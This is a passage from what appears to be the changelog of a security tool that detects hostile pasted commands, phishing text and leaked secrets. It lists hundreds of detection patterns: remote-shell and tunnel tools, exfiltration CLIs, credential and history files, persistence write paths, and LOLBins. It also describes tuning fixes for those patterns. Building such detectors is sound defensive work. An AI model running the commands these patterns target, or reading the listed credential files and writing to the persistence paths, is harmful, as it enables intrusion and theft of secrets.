  `new-pssession`, `invoke-command`, `invoke-expression`, gated
  `iex` ` (`/` new-` forms, `invoke-wmicommand`, `invoke-cimmethod`,
  `commandlineeventconsumer`, `__eventfilter`,
  `activescripteventconsumer`, `paexec`, `set-mpcomputerstatus`,
  `remove-mppreference`, `mpcmdrun` flags), headless browsers and
  webshot (`chromium`/`chrome`/`msedge`/`firefox --headless`,
  `wkhtmltoimage`, `wkhtmltopdf`, `cutycapt`, `phantomjs`, `casperjs`,
  `slimerjs`, `trurl`, gated `playwright`/`puppeteer`), curl/wget
  extras (`curl --resolve`/`--connect-to`/`--cert`/`--key`/`--config`/
  `--crlfile`/`--pinnedpubkey`, `wget --method`/`--body-*`/`--header`/
  `--user`/`--password`/`--ftp-*`/`--http-*`, `chronyc` write verbs,
  `rdate -`), and credential/history/log recon (`find -name` ×
  cred patterns, `grep -r` × private/password/secret/begin/credential/
  passwd, `getent netgroup`, `compgen` user/group/all gates,
  `history -a`/`-r`/`-p`/`-s`, `fc -l`, ` net ` verb gate,
  `mongoexport`/`mongodump`/`mongorestore`, `mount -t cifs`/`nfs`/
  `smbfs`/`davfs`/`sshfs`, `mount_smbfs`, `mount_nfs`) — all at
  ALERT 45.
- **P10 credential-file list extended**: `.pgpass`, `.my.cnf`,
  `.pypirc`, `.s3cfg`, `.boto`, `.env`, `master.passwd`,
  `/etc/security`, `/etc/group`, `/etc/sudoers`, `sudoers.d`,
  `/etc/login.defs`, `config/gcloud`, `.azure`, shell/history files
  (`_history`, `.viminfo`, `.lesshst`, `.wget-hsts`), and log files
  (`auth.log`, `/var/log/secure`/`btmp`/`wtmp`/`lastlog`/`faillog`)
  — ALERT 40.

### Fixed

- `n-able` word-internal collision closed: the `nable` needle matched
  `enable`/`sustainable` — now `n-able` hyphenated form.
- `sv` word-internal collision closed: `sv ` matched `csv ` — now
  ` sv ` boundary form.
- `ipa` gate ` -` catch-all removed (matched `multipath` via
  word-internal `ipa`) — verb-list only.
- `oc` gate boundary fix: `oc` matched inside `docs` — now `oc `.
- `iex` gate ` -`/`-s` forms removed (Elixir `iex -S mix` benign) —
  ` (`/` new-` only.
- `capsh` gate ` --` self-satisfied on `--print` benign — now
  ` -- ` exec form plus `--decode`.
- `tmux` gate ` new` hit `new-session` benign — now ` new `.
- `go tool` gate tightened to ` tool ` (`go tools` docs benign).
- `geth`/`electrum` ` -` catch-alls self-satisfied on `--version` —
  verb-list gates only.
- P10 log needles scoped to `/var/log/` paths (`wtmp`/`btmp`/
  `lastlog`/`faillog` prose benigns closed).
- Design-scope updates: `modprobe`/`depmod`/`ntdsutil`/`dnscmd`/
  `invoke-*`/`new-pssession`/`lldb`/`strace`/`gdb`/`ssh-agent`/
  `unshare` exec forms, `history -a`, `cat` on `.bash_history`/
  `/etc/sudoers`/`.env`-family files, `vinagre`/`krdc`/`ssvnc`/
  `ostinato`/`blkdiscard`/`kopia`/`n-able` docs mentions, and
  `net`-family recon moved from benign tests to hit tests — kernel
  module ops, AD recon, PS remoting, debug/exec primitives, cred
  file reads, and inventory probes are paste-context primitives by
  design.

### Added (cycle-248)

- **Paste-detector breadth — legacy remote access, mail/sync daemons,
  non-git VCS, share services** (`hlse_supply.c`): BSD r-tools and
  NIS/NIS+ administration (`rsh` flag-gated, `rlogin`, `rexec`, `rcp`,
  `telnet`, `rwho`, `ruptime`, `rusers`, `rwhod`, `rwalld`, `ypcat`,
  `ypmatch`, `ypbind`, `ypset`, `ypserv`, `yppasswd`, `niscat`,
  `nistbladm`, `nisaddcred`, `ldapsearch`, `ldapwhoami`), mailbox and
  mail-admin tooling (`doveadm`, `zmprov`, `zmmailbox`, `imapsync`,
  `isync`, `notmuch`, `sendemail`, `mailutils`, `heirloom-mailx`,
  `mutt` send-flags, `mailx`, `s-nail`, `rsync -e/--rsh/rsync://`,
  `lsyncd`, `syncthing`, `rslsync`, `resilio`), CMS/framework CLIs
  (`drush`, `wp-cli`, `artisan tinker|serve`, `occ`), file-sharing
  daemons (`vsftpd`, `pure-ftpd`, `proftpd`, `tftpd`/`atftpd`/
  `in.tftpd`/`tftpd-hpa`, `smbd`/`nmbd`, `exportfs`, `unfs3`,
  `nfs-ganesha`, `fusedav`, `sftpgo`, `pyftpdlib`, `filebrowser`,
  `webdav://`/`webdav mount`, `mc alias|admin|mirror`), overlay/P2P
  and torrent services (`etserver`, `supernode`, `ssserver`, `sslocal`,
  `mieru`, `wireproxy`, `transmission-cli`, `deluge-console`,
  `qbittorrent-nox`, `rtorrent`, `mktorrent`, `ctorrent`, `axel`,
  `prozilla`, `mget`, `getx`, `snarf`), non-git VCS destructive and
  admin forms (`hg strip|rollback|purge|backout|graft`, `svn
  delete|import|switch|merge|revert|copy|cp`, `svnadmin dump|load|
  setrevprop`, `fossil ui|server|clone|open`, `jj abandon|undo|squash`,
  `pijul`, `darcs`, `bzr`, `monotone`, `cvs admin|-d|checkout|commit`),
  SNMP/ZMap/network utilities (`oidwalk`, `snmpbulkwalk`, `snmpdf`,
  `snmpstatus`, `snmptest`, `zdns`, `ztee`, `zannotate`, `netsed`,
  `termshark`, `macchanger`, `nxc`, `sparta`, `legion`, `caldera`,
  `safebreach`, `dnsmasq`), emulators and crypto helpers (`waydroid`,
  `genymotion`, `anbox`, `age` word-boundary form, `rage`), and mail
  infrastructure (`smtpd`, `exim`/`exim4`, `postqueue`, `postcat`,
  `postsuper`, `postsrsd`, `opendkim`, `dkimproxy`, `spamc`, `spamctl`,
  `bogofilter`, `razor-admin`, `pyzor`, `dccproc`, `postmap`,
  `postalias`, `newaliases`, `qmail`) — all at ALERT 45.

### Fixed

- Substring collision guards: `rsh` gate now requires `-l`/`-n`
  (`virsh` benigns closed), `age` requires word-boundary ` age `
  form (`manage -r`/`qlmanage -r` FP closed), `mutt` requires send
  flags `-a`/`-s`/`-e`/`-h` (`mutt --version` benign stays clean).
- Design-scope updates: legacy `mailx`/`ldapsearch`/`rsync -e`/
  `telnet` benign entries moved to hit tests — remote-shell sync,
  plaintext remote access, and mail-send are paste-context exfil
  and remote-exec primitives by design.

### Added (cycle-247)

- **Paste-detector breadth — overlay networks, VCS destruction,
  persistence paths, exec/decode helpers** (`hlse_supply.c`):
  overlay/tunnel clients beyond the existing tailscale gate
  (`zerotier-one`, `openfortivpn`, `nebula`, `tinc`, `bore`,
  `http-server`, `serveo`, `frp`, `croc send`, `magic-wormhole`,
  `wormhole send`, `pwndrop`, `intersh`, `pwncat`/`pwncat-cs`,
  `transfer.sh`, `tailscale ssh`), rootkit/UEFI/firmware-analysis and
  scanner names (`reptile`, `diamorphine`, `kerberoast`, `chipsec`,
  `uefitool`, `ifdtool`, `braa`, `openvas`, `gvm-cli`, `nessus`),
  k8s/deploy/DB helper CLIs (`k9s`, `stern`, `tkn`, `dagger`, `werf`,
  `skaffold`, `tilt`, `earthly`, `devspace`, `localstack`, `assumego`,
  `granted`, `okta-aws`, `litecli`, `pgcli`, `mycli`, `iredis`, `usql`),
  perf/trace/cgroup/namespace control (`perf script|trace|probe|sched`,
  `oprofile`, `systemtap`/`stap`, `sysprof`, `bcc`, `setns`, `lsns`,
  `netns exec`, `systemd-cgls`/`cgtop`, `cgexec`/`cgcreate`/`cgset`/
  `cgdelete`/`cgclassify`/`cgservice`/`lssubsys`, `chcpu`/`chmem`,
  `machinectl login|enable|terminate|poweroff|reboot`, `unshare -n/-p`,
  `bwrap --uid`, `firejail --join`, `chsh -s`, `chfn`, extended
  `systemd-run` flags), traffic-control and link primitives
  (`tc qdisc|filter|class|action` write verbs, `ethtool -K/--set-*`,
  `ip maddress`/`ip mroute`/`ip vrf`), git destructive and
  config-poisoning forms (`push -f/--force/--delete`, `branch -d`,
  `tag -d`, `rm -r/--cached`, `update-index --assume-unchanged/
  --skip-worktree`, `filter-branch`/`filter-repo`, `gc --prune`,
  `reflog expire|delete`, `stash drop|clear`, `clean -f/-x/-d`,
  `reset --hard`, `checkout --`, `remote add|set-url|remove`,
  `config alias.|core.pager|core.editor|core.hooks|include.|
  credential.`, `submodule update|add`, `clone -u/--upload-pack/
  --template`, `bundle create`, `archive --remote`, `format-patch
  --stdout|-o`), editor/exec/decode helpers (`nano -s`, `xargs
  sh|bash|sudo`, `make --eval`, `cmake -P`, `uudecode`/`uuencode`/
  `basenc`, `perl -MMIME::Base64`, `setpriv --init-groups/--reset-env`,
  `capsh --decode`, `usbipd`/`usbip`, `whoami /priv|/all|/groups`),
  and Windows residual LOLBins (`desktopimgdownldr`, `mftrace`,
  `shdocvw`, `stordiag`, `wab.exe`, `msconfig`, `presentationsettings`,
  `ieadvpack`, `iedll`, `infocard`, `migwiz`, `mshfp`, `scrcons`,
  `makecab`, `replace.exe`, `te.exe`, `fsutil usn/behavior/reparsepoint/
  objectid`, `gpresult /h`, `pubprn http`, `slmgr /x`,
  `squirrel --update`, `at.exe \\\\host`).

- **Persistence-write path coverage (P11)**: the append/tee write rule
  now also fires on `~/.ssh/rc`, `/etc/update-motd.d`, `/etc/pam.d`,
  `sshd_config`, `/etc/rc.d`, `~/.config/systemd/user`,
  `/etc/udev/rules.d`, `/etc/sysctl.d`, `/etc/ld.so.conf.d`,
  `/etc/pacman.d`, `/etc/environment`, `/etc/timezone`, `/etc/hosts`,
  `/etc/resolv.conf`, `nsswitch.conf`, `~/.vimrc`, `~/.tmux.conf`,
  `config.fish`, `~/.netrc`, `~/.rhosts`, `hosts.equiv`, `~/.npmrc`,
  `~/.curlrc`, `~/.gitconfig` — shell-init, auth-store, DNS-poison and
  tool-config persistence paths that previously slipped through.

### Fixed

- `P11` regression guard: `/etc/zshrc` and `/etc/zprofile` write-append
  entries restored after a refactor dropped them (test-gap caught).
- Gate tuning for routine-verdict collisions: `tc` needles now require
  write verbs (bare `tc qdisc show` stays clean), `perf` drops `top`/
  `stat` (live/stats benigns) keeping `script`/`trace`/`probe`/`sched`,
  `oprofile`/`stap`/`braa`/`mycli`/`frp` get boundary treatment
  (`noprofile`/`stapler`/`braai`/`myclient` word-internal FP closed),
  `tinc`/`tkn`/`skaffold` use flag/verb gates so `--version` benigns
  stay clean, `netns` requires `exec`, `capsh` drops `--print`
  (capability listing is routine), `fsutil` drops the ` file` subkey
  (`query`/`createnew` benigns), and `rasdial`/`tttracer`/`expand`
  were removed as weak signals that collided with existing benigns.


### Added (cycle-246)

- **Paste-detector breadth — management & attack surface closure**
  (`hlse_supply.c`): ~700 new `paste` primitives at ALERT 45 covering
  JDK attach/exec (`javaws`/`jshell`/`jmap`/`jstack`/`jcmd`/`jps`),
  interpreter exec surfaces (groovy/dart/zig/crystal/sbcl/gforth/ghc/
  luajit/mruby/ponyc/janet/fennel/hy/babashka/matlab/scilab), the
  Sysinternals recon suite (pssuspend/psping/psloggedon/listdlls/
  procexp/procmon/tcpview/rammap/vmmap/winobj/livekd/du64/efsdump/
  adexplorer/sysmon/sigcheck/junction), SMB/AD/LDAP write+enum
  (samba-tool/sss_*/ldb*/tdb*/smbcacls/pdbedit), Kerberos material
  (k5srvutil/kprop/kdb5_util/krb5kdc/kvno/ksu/ktab/gssproxy), TPM/HSM
  (softhsm2/pcscd/scdaemon/tcsd/swtpm/tpm2_*), CA/cert forgery
  (cfssl/certstrap/minica/mkcert/easyrsa/certtool/step), routing
  daemons for BGP/session hijack (bird/vtysh/bgpd/ospfd/zebra/babeld/
  cjdns/yggdrasil/exabgp/quagga), IDS/AV/log-pipeline kill+recon
  (snort/suricata/zeek/clamav/rkhunter/unhide/telegraf/node_exporter/
  winlogbeat/nxlog), audit/SELinux read tools (ausearch/aureport/
  aulast/seinfo/findcon/getpcaps/setfattr), supervisor/daemon mgmt
  (start-stop-daemon/svscan/s6-*/svccfg/circusctl/dtach/run0/toybox/
  busybox inetd/debootstrap/nsjail/pk*/dbus-*), fake-BTS + SDR +
  hardware-flash (yate/osmo-*/srs*/open5gs/limesdr/bladerf/soapysdr/
  gnuradio/jlink/stlink/stm32*/teensyloader/espefuse/picotool/yosys/
  urjtag/buspirate/odin/spflashtool/miflash/rkdeveloptool/nanddump/
  flash_*/ubi*/mtd*/jffs2*), BLE/BT attack set (gattacker/bluebug*/
  carwhisperer/hidattack/nrf-sniffer/hackzwave), firmware/PE/PDF/
  Office-doc extraction (mitmf/cabextract/unsquashfs/emba/firmadyne/
  pev/peframe/pe-bear/zsteg/pdf-parser/peepdf/oletools/olevba/
  pcodedmp), iOS jailbreak + Android root/pinning bypass (unc0ver/
  taurine/dopamine/checkra1n-era loaders/cydia/sileo/trollstore/
  sideloadly/cycript/kernelsu/zygisk/lsposed/sslunpinning/vysor),
  anonymity/covert transports + proxy servers (obfs4proxy/dnstt/
  snowflake/gnunet/freenet/i2p/zeronet/lyrebird/stegotorus/n2n/
  freelan/openziti/wg-write/graftcp/badvpn/sockd/pproxy/privoxy/
  polipo/tinyproxy/mitmweb), phishing kits + OSINT/attack surfaces
  (darkphish/sn1per/osmedeus/reconftw/maltego/dmitry/fofa/shodan-like
  services/malware-repos/subdomain-tooling), eBPF offensive tooling
  (tracee/ebpfkit/triplecross/bpfkexec/pamspy), ELF patch +
  assembler/linker (patchelf/chrpath/execstack/paxctl/checksec/
  objcopy/nasm/fasm/yasm/ml64/sdcc/tcc), secret-fetch CLIs
  (envconsul/credstash/vals/dotenvx/aws-vault/saml2aws/oauth2l/
  fly auth token/heroku auth:token/az get-access-token/gcloud
  print-access-token/kubectl config view/terraform output),
  VCS + pkg-helper write ops (sfdx/sf/tea/p4/svn/hg/fossil/
  git-annex/git-filter-repo/bfg/jj/yay/paru/pamac/guix/xbps/urpmi/
  aptitude/dpkg/alien), file watchers + utmp/wtmp session-spy
  (watchexec/entr/fswatch/inotify*/fsmon/watchman/viddy/utmpdump/
  wtmpdump/lastb/dump-acct/lastcomm/acctcom/lslogins/getent passwd),
  Windows misc (winword/excel exec flags/mspub/odbcad32/mobsync/
  diantz/printbrm/winsat/cdb/ntsd/dbgshell/editor tunnels/faketime),
  sync/exfil upload CLIs (megatools/dbxcli/gdrive/odrive/nextcloudcmd/
  owncloudcmd/seaf-cli), remote-desktop/SSH clients + log pipeline
  (winbox/mremoteng/xfreerdp/rdesktop/remmina/rdpwrap/mobaxterm/
  xshell/securecrt/bitvise/termius/psftp/pageant/kitty/putty/tftp/
  rsyslogd/syslog-ng), and clipboard/wayland/X11 control + KVM-share
  (cliphist/copyq/gpaste/sunshine/waypipe/x2x/input-leap/deskflow/
  neatvnc/wl-screenrec/dotool/kmonad/kanata/xev/xprop/weston/dwl/
  wayfire/labwc/qtile/herbstluftwm/bspwm/wmctrl/swayidle/swaylock/
  wlfreerdp).

### Fixed

- **Word-internal substring traps in the new verbs** (`hlse_supply.c`):
  `stem`/`pen`/`rshell`/`grim`/`cage`/`river`/`fact`/`guile`/`racket`
  matched inside `system`/`filesystem`/`systemd-*`, `open`/`openssl`/
  `openvpn`/`openocd`, `powershell`, `pilgrim`, `birdcage`, `driver`,
  `artifact`, `beguile`, `bracket` — dropped or re-gated; `odin`/`wcl`/
  `die`/`sniffle`/`entr`/`gazer`/`contig`/`attr`/`meek`/`hans`/`gp`/
  `gap`/`foca`/`escript`/`jdb`/`zed`/`devolutions`/`hitch`/`stud`/
  `balance`/`yate`/`cero` got a trailing-space boundary so
  `iodine`/`hwclock`/`studied`/`sniffles`/`entry`/`stargazer`/
  `contiguous`/`attribute`/`meekly`/`hansel`/`gpg`/`gaps`/`focaccia`/
  `description`/`jdbc`/`analyzed`/`hitchhike`/`study`/`counterbalance`/
  `yates`/`traceroute` stay clean; `p4` verb-gate lost the bare ` -`
  alternative (`.mp4` file args) and ` change` (plural `changes`
  enumeration stays benign).

### Fixed

- **CJK false positive in terminal-escape detection** (`hlse_text.c`):
  the carrier scanner treated every bare `0x9B`/`0x9D` byte as CSI/OSC,
  but those are valid UTF-8 continuation bytes — ordinary CJK text
  (e.g. 電 = `E9 9B BB`, 購 = `E8 B3 BC`) hit "Terminal control
  sequence" and scored BLOCK. A UTF-8 lead byte now consumes its whole
  multibyte sequence before the byte is considered.
- **cli_integration early abort** (test harness): the `--stdin`
  collection ran under `set -e` — once 'URGENT wire money'
  legitimately crossed the BLOCK gate (exit 1) the whole suite
  aborted silently. The capture now tolerates the verdict exit
  code, and the stale 'objective absent for text' fixture uses
  genuinely-benign text.
- **secrets: `api_org_` (Hugging Face org token) never fired on real
  tokens** — the row used `is_alpha`, which rejects any suffix containing
  a digit, so a genuine key scored OK. Now `is_alnum_or_dash`.
- **secrets: duplicate pattern rows** accumulated across cycles —
  `dop_v1_`/`dp.pt.`/`PMAK-`/`dt0c01.`/`glsa_`/`sbp_`/`rnd_`/`SK`/`figd_`/
  `pscale_tkn_`/`CFPAT-` each existed twice with divergent specs (the
  mislabelled `dop_v1_` "Doppler" row shadowed the correct DigitalOcean
  one; `sbp_` had both a wrong "service role" label and the real
  personal-access-token row). Deduplicated to the real-format row.

### Fixed

- **Duplicate keyword entries double-counted hits** (`hlse_text.c`):
  16 phrases appeared twice inside `BAIT_WORDS` and 6 more inside
  `AUTHORITY`/`GROOMING`/`FAKE_ALERT`/`CALLBACK_PHISH`, so one
  matching phrase scored as two hits (e.g. 'wire transfer' counted
  twice pushed benign-adjacent text past the LOG threshold).
  Removed the later copies (kept the first, thematic placement);
  `subscription has been renewed`/`call to cancel` now live only
  in `CALLBACK_PHISH_WORDS`, where they belong semantically.
  `wire transfer instructions` added explicitly to keep the BEC
  payout-redirect phrase flagging after its accidental second hit
  was removed.
- **Bare 'medicare'/'medicaid' over-triggered AUTHORITY**
  (`hlse_text.c`): any casual mention of medicare scored the
  25-point authority base on its own — the same over-breadth the
  file already rejects for 'cra'/'ato'. Replaced with qualified
  forms ('medicare office/enrollment/hotline', 'medicaid
  office/enrollment') that keep the impersonation surface while
  leaving ordinary speech clean.

### Fixed

- **base64url audit sweep + wrong Instagram prefix**
  (`hlse_secrets.c`): the remaining `is_base64` (`+`/`/`) rows —
  `fsq3`, `phc_`, `hbp_` — moved to `is_b64url` so `-`/`_` bodies
  match; and the `IGQWR` Instagram row never existed in the
  wild — real Basic-Display/Graph tokens start `IGQVJ`, so the
  prefix was corrected and moved to `is_b64url` (40-char body).

- **base64url charset misses** (`hlse_secrets.c`): the
  SendGrid `SG.<22>.<43>` entry used the alnum-dash set (the
  real format's inner `.` and `-`/`_` body never matched), and
  `hvs.`/`hvb.` used `is_base64` (`+`/`/`) while HashiCorp
  tokens are base64url (`-`/`_`) — all structurally missed live
  keys. New `is_b64url`/`is_b64url_dot` charsets applied to
  SG./mlsn./sl./sk.eyJ/pk.eyJ/dt0c01./dt0s16./dt0s01./hvs./hvb.;
  the duplicate `sl.`/`dt0c01.` rows introduced in the previous
  cycle were collapsed onto them.

### Fixed

- **Unreachable duplicate `shp*` secret rows** (`hlse_secrets.c`):
  a second Shopify block (min_suffix 32) sat under the
  min_suffix-30 rows — first match wins, so the later rows were
  dead weight; collapsed into a note. Detection unchanged.

### Added

- **DB dump/exfil + mail-sync + object-store/backup + RMM/remote-access
  names + modern proxy/tunnel transports + BYOVD drivers/packers +
  cloud-attack/spray/phish kits + miners + BCC eBPF snoopers +
  forensic/FIM/EDR names + dsniff/DoS/THC-IPv6 + SNMP/IKE/crackers +
  wifi/BT/NFC/CAN/SCADA tooling + remaining Windows mgmt
  (msdt/mmc/setx/cipher/fsutil/netsh wfp|winhttp/wpr/xperf/appcmd/
  aspnet_regiis/gacutil/ngen/devenv/csi/fsi/usoclient) + remaining
  Unix mgmt (keyctl/sbctl/binfmt/systemd-*/ld-linux/flatpak-spawn/
  gdbus/killall5/fuser/accton/vconfig/rfkill/update-rc.d/chkconfig/
  pkg/snap/flatpak/brew/uv/rye/mamba/conda/poetry/pdm/dotnet/cargo/
  nuget/choco/scoop/winget/appx) primitives (cycle-245)**:
  flags, at LOG/ALERT in paste context —
  pg_dump/mysqldump/mariadb(-dump|-backup)/mongodump/mongoexport/
  elasticdump/sqlite3 .dump/redis-cli --rdb/bcp out/expdp/sqlldr/
  wal-g/pgbackrest/(maria|xtra)backup/nodetool drain etc. and
  fetchmail/offlineimap/mbsync mailbox pull-down; ipfs/s3cmd/mc/
  velero/tkn/kn/argo/buildctl/crun/jexec/toolbox/distrobox object-store
  and runtime exec forms; ~45 RMM/remote-access names (teamviewer/
  anydesk/rustdesk/screenconnect/meshagent/ninjarmm/atera/datto/
  splashtop/×vnc/nomachine/dwagent/hamachi/logmein/tacticalrmm/
  simplehelp/aeroadmin/ammyy/impero/sshx/upterm/xrdp/remotepc/
  litemanager/mikogo/goverlan/optitune/addigy/quickassist/islonline/
  netop/gocket/beanywhere, real-word parsec/moonlight/supremo
  flag-gated); modern proxy/C2 transports (sing-box/mihomo/hiddify/
  naiveproxy/brook/tuic/juicity/snell/v2fly/ocserv/tincd/tailscale/
  zerotier/netbird/nebula/headscale/innernet/netmaker/nps/npc/suo5/
  venom/stowaway/iox/rakshasa/regory/ssf/pystinger/lcx/htran/rinetd/
  redsocks/tun2socks/mosh-server/localtunnel/expose/pagekite/bore/
  inlets/packetriot/localxpose/ztncui/tinc — real words flag-gated);
  BYOVD driver + packer/protector names (kdmapper/capcom/gdrv/dbutil/
  rtcore64/iqvw64e/asrdrv/vboxdrv/hevd/runpe/themida/vmprotect/
  obsidium/molebox/mpress/aspack/petite/kkrunchy/sgn/pe2sh/amber/
  inceptor/pecloak) and miner names (t-rex/claymore/srbminer/
  cryptotab/ccminer/wildrig/excavator); AD/recon/OSINT/cloud-attack +
  spray names (cme/adfind/admod/kekeo/certify/maigret/blackbird/
  snoop/toutatis/instaloader/osintgram/git-dumper/gitgraber/
  dvcs-ripper/uro/unfurl/waymore/linkfinder/qsreplace/cloudfox/pacu/
  enumerate-iam/prowler/s3scanner/s3enum/bucketfinder/awsbucketdump/
  grayhatwarfare/skyark/weirdaal/iamhound/o365spray/msolspray/
  adfspray/fireprox/spray365/trevorspray/credmaster/go365/ruler);
  phish/C2/webshell extras (evilnovnc/cred-sniper/merlin/pupy/chaos/
  wsc2/doctrack/chopper/tinyshell/webhandler/kubestriker/kubelite);
  BCC eBPF tools (sslsniff/bashreadline/tcpconnect/tcpaccept/
  statsnoop/capable/funclatency/argdist/funccount); forensic +
  memory-acquisition (tsk_*/fls/icat/mmls/autopsy/sleuthkit/dcfldd/
  dc3dd/ddrescue/safecopy/foremost/scalpel/magicrescue/lime/fmem/
  memdump/mdd/makedumpfile/vmss2core); FIM/EDR names (osqueryi/
  velociraptor/ossec/samhain/aide/tripwire/wazuh/afick/integrit);
  dsniff suite + DoS + THC-IPv6 (mitmdump/urlsnarf/filesnarf/
  mailsnarf/msgsnarf/sshmitm/webmitm/webspy/tcpkill/tcpnice/
  slowhttptest/goldeneye/hulk/rudy/torshammer/pyloris/ufonet/xerxes/
  thc-ipv6/atk6-*/denial6/dos-new-ip6/flood_*/fake_*6/kill_router6/
  ndpexhaust/thcping6/thcsyn6/smurf6/rsmurf6/toobig6/trace6/fuzz_ip6/
  inject_alive6/passive_discovery6/dnsdict6/dnsrevenum6/dump_router6/
  exploit6/sendpees/node_query6/randicmp6/redir6); SNMP/IKE/password
  crackers (onesixtyone/snmpwalk/snmpget/snmpset/snmpcheck/ike-scan/
  psk-crack/vpnc/swanctl/racoon/fcrackzip/pdfcrack/rarcrack/pkcrack/
  bkcrack/rcrack/ophcrack/cowpatty/asleap/pyrit/eapeak); aircrack-ng
  family (hcx*/besside/airdecap/tkiptun/wesside/packetforge/airolib/
  easside/airserv/ivstools/makeivs/buddy-ng/create_ap/fern-wifi/
  linset/wpa_cli); BT/NFC/CAN/SCADA (spooftooph/redfang/bluesnarfer/
  bluelog/btscanner/l2ping/sdptool/obexftp/ussp-push/chameleon-mini/
  rfidiot/ykman/pkcs11-tool/pkcs15/opensc-tool/pcsc_scan/
  yubico-piv-tool/cardpeek/mifare/cansend/candump/canplayer/
  cansniffer/isotpsend/slcand/plcscan/s7scan/mbtget/diagslave/
  opcua-client/iec104/dnp3/enip/s7comm/plcinjector/melsec/codesys);
  Windows (mofcomp/wbemtest/msdt/sdiageng/mmc .msc/winhelp/setx /m/
  cipher /e|/d|/w/fsutil volume-dismount|hardlink|reparsepoint/
  mountvol /p|/d/subst drive-map/wecutil/netsh wfp capture|winhttp
  set/wpr/xperf/tracerpt/relog/imagex/appcmd/aspnet_regiis/gacutil/
  ngen/devenv /command/csi/fsi/scriptcs/dotnet-script/usoclient/
  wuauclt); Unix (keyctl dump/print/pipe/search/update/revoke/
  negate/purge, sbctl enroll|sign, sbsign, fio /dev, badblocks -w,
  sg_persist, ndctl destroy|sanitize, ipmctl delete|format, binfmt_misc
  register, systemd-sysusers, systemd-firstboot, portablectl attach,
  ld-linux/ld-musl/ld.so.2 loader-exec, flatpak-spawn --host, gdbus
  call|emit|monitor, killall5, fuser -k, accton off, vconfig add|rem,
  rfkill block|unblock, update-rc.d defaults|remove|enable|disable,
  chkconfig --add|--del|on|off, opkg install|remove|upgrade, emerge
  --unmerge|--depclean|--sync, pkg/snap/flatpak/brew/port install|
  uninstall|remove, uv pip|tool|publish|uvx, rye|mamba|conda|poetry|
  pdm add|remove|install|publish|sync, dotnet tool|add, cargo add|
  owner|yank, nuget install|push|delete, choco/scoop/winget install|
  uninstall|push|import, Add/Remove-AppxPackage, msix). All bare
  invented names flag on mention (mimikatz convention); every
  real-word name is flag/verb gated. Trailing-space verb gates
  prevent 'installs/adds' prose prefix-matches; icat gated 'icat ' to
  stop certif-icat-e/pred-icat-e word-internal hits.

- **K8s/mesh/registry/IaC helper CLIs + secret-CLIs + UAC-bypass
  LOLBins + backup destruction + exec-context/daemonization +
  privilege-boundary + kerberos/tmux/screen exec + dialog-spoof +
  VPN/proxy/NAT + interpreter -c + package-runner exec (cycle-244)**:
  flags, at LOG/ALERT in paste context —
  k8s helpers: `kubectx`, `kubens`, `k9s -n`, `stern -l`, `kail`,
  `kubecm`, `krew install`, `telepresence`, `mirrord`, `kapp
  deploy|delete`, `kbld -f`, `ytt`, `vendir sync`, `skaffold
  deploy|run`, `tilt up`, `garden deploy`, `draft up|create`;
  mesh/registry: `istioctl manifest|install`, `linkerd`, `consul
  connect|kv|acl|reload|leave`, `cilium install`, `calicoctl apply`,
  `crane copy`, `regctl`, `notation`, `docker-credential-osxkeychain`;
  IaC/scan: `terragrunt apply|destroy|run-all`, `atlantis plan|apply|
  unlock`, `terramate`, `crossplane`, `checkov`, `tfsec`, `terrascan`,
  `kics`, `conftest`, `opa eval|exec|run`, `trivy`, `grype`, `syft`;
  secret CLIs: `op get|inject|signin|read|document|item|vault`,
  `doppler secrets|run`, `infisical secrets|run`;
  Sysinternals/UAC LOLBins: `pslist|pskill|psinfo|accesschk|autoruns|
  pipelist|sigcheck|streams|sdelete`, `fodhelper`, `computerdefaults`,
  `sdclt`, `slui`, `eventvwr`, `wsreset`, `wt.exe`, `te.exe`,
  `tracker`, `vsiisexelauncher`, `wmpsetup`, `workfolders`, `cmlutil`,
  `slmgr /ato`, `rasautou`, `rdpsign`, `sftp -b`;
  backup destruction: `restic forget|backup|prune`, `borg
  prune|delete|create`, `rsync --delete`, `rdiff-backup`, `duplicity
  remove|cleanup`, `kopia snapshot|delete|maintenance`, `bconsole`;
  exec context/daemonization: `setsid`, `nohup`, `disown`,
  `daemonize`, `start-stop-daemon -b`, `sg`, `newgrp`, `getcap -r`,
  `ktutil`, `kadmin`, `msktutil`, `systemd-run --pty|--uid|--collect|
  --property|--on-|--unit|--description|--timer|--path|--socket|
  --mount|--nice|--setenv|--working-directory`, `systemd-cat`,
  `systemd-tmpfiles --create|--remove|--clean`, `systemd-inhibit`,
  `busctl set-property|call`, `logger -n|-r|--server|-t`, `hwclock
  --systohc|--hctosys|--set|--adjust|--epoch=`, `ntpdate`, `chronyc
  offline|online|settime|makestep|sources`;
  tmux/screen/inotify exec: `tmux new-session -d|new -d|load-buffer|
  source-file`, `screen -dm|-dmS|-d -m`, `inotifywait -m|-r|-e`,
  `watch -n|-x`;
  dialog/spoof: `zenity`, `kdialog`, `whiptail`, `newt`, `osascript
  display dialog|alert`, `notify-send -u|-i|--urgency`;
  NAT/proxy/VPN: `dnctl`, `natd`, `portfwd`, `redir
  --lport|--cport|--laddr|--caddr|--bport|--bind`, `nginx -c|-g`,
  `haproxy -f|-db`, `caddy run|reload`, `tinyproxy`, `squid -f|-z|-k`,
  `polipo`, `microsocks`, `3proxy`, `openvpn
  --config|--daemon|--up|--down|--script-security|--mktun|--rmtun|
  --remote|--dev`, `wireguard`, `wg-quick up|down`, `xl2tpd`,
  `pptpd`, `openconnect`;
  interpreter `-c`/exec: `tclsh`, `julia -e`, `R -e`, `Rscript -e`,
  `octave --eval`, `maxima --batch`, `ghci -e`, `runhaskell`,
  `fish|zsh|ksh|dash|csh -c`, `powershell|pwsh -c|-ec|-ep bypass|
  -ep unrestricted|-executionpolicy bypass|unrestricted|-sta|-mta|
  -w hidden|-windowstyle hidden`, `deno run|eval|task`, `bun
  run|bunx|-e`, `npx`, `pnpm|yarn dlx|exec`, `pipx`, `go install|
  run`, `composer require|global|exec|create-project|install`,
  `nimble install|build|run|init|doc|refresh`, `opam install|exec`,
  `luarocks`, `at now|-f`, `batch <|-f`, `env -i`, `env x=y <cmd>` —
  six benign expectations (`eventvwr`, `at now + 5`, `npx/pnpm/yarn/
  bunx` runner forms, `watch -n`, `systemd-run --user`, `te.exe`,
  `pipx/cargo/composer` install forms, `perl -MData::Dumper`)
  relocated to hits as the design-flagged exec/supply-chain
  primitives.

- **Mobile device control + RE/OSINT tool names + SCADA/telephony/
  queue/DB-destructive + supply-publish + CI/deploy + supervisor/
  journald + hardware/radio/input-snoop + fake-infra/phish/C2
  primitives (cycle-243)**: flags, at LOG/ALERT in paste context —
